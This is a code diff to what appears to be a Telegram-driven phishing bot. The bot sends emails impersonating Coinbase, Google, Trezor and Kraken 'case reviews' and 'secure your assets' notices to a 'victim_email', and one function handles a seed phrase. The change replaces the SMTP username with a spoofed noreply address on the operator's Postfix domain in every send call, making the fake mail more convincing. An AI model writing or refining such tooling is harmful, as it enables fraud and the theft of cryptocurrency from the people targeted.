@@ -349,7 +349,7 @@ async def get_custom_html(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         try:
             send_email_through_smtp(
                 sender_name,
-                smtp_details["username"],
+                f"noreply@{postfix_config['domain']}",
                 subject,
                 msg,
                 victim_email
@@ -622,7 +622,7 @@ async def send_employee_coinbase_email(
 
         send_email_through_smtp(
             "Coinbase",
-            smtp_details["username"],
+            f"noreply@{postfix_config['domain']}",
             "Coinbase Case Review",
             msg,
             recipients,
@@ -665,7 +665,7 @@ async def send_wallet_coinbase_email(context, recipients, seed_phrase, display_e
 
         send_email_through_smtp(
             "Coinbase",
-            smtp_details["username"],
+            f"noreply@{postfix_config['domain']}",
             "Secure your assets to self-custody",
             msg,
             recipients,
@@ -708,7 +708,7 @@ async def send_secure_coinbase_email(
 
         send_email_through_smtp(
             "Coinbase",
-            smtp_details["username"],
+            f"noreply@{postfix_config['domain']}",
             "Secure Coinbase Token",
             msg,
             recipients,
@@ -758,7 +758,7 @@ async def send_employee_google_email(
             msg.attach(img)
 
         send_email_through_smtp(
-            "Google", smtp_details["username"], "Google Case Review", msg, recipients
+            "Google", f"noreply@{postfix_config['domain']}", "Google Case Review", msg, recipients
         )
         return "Google Employee Mail sent successfully!"
     except Exception as e:
@@ -835,7 +835,7 @@ async def send_employee_trezor_email(
 
         send_email_through_smtp(
             "Trezor",
-            smtp_details["username"],
+            f"noreply@{postfix_config['domain']}",
             "Your case is under review",
             msg,
             recipients,
@@ -906,7 +906,7 @@ async def send_employee_kraken_email(
     try:
         send_email_through_smtp(
             "Kraken",
-            smtp_details["username"],
+            f"noreply@{postfix_config['domain']}",
             "Your case is under review",
             msg,
             recipients,
@@ -970,7 +970,7 @@ async def send_coinbase_delay_email(update: Update, context: ContextTypes.DEFAUL
 
         send_email_through_smtp(
             "Coinbase",
-            smtp_details["username"],
+            f"noreply@{postfix_config['domain']}",
             "A manual review is pending",
             msg,
             recipients,
@@ -1018,6 +1018,7 @@ def send_email_through_postfix(display_name, from_address, subject, msg, recipie
 def send_email_through_smtp(display_name, smtp_username, subject, msg, recipients):
     """
     Legacy compatibility wrapper - redirects to Postfix implementation.
+    The smtp_username parameter is used as the from_address for the new function.
     """
     return send_email_through_postfix(display_name, smtp_username, subject, msg, recipients)
 
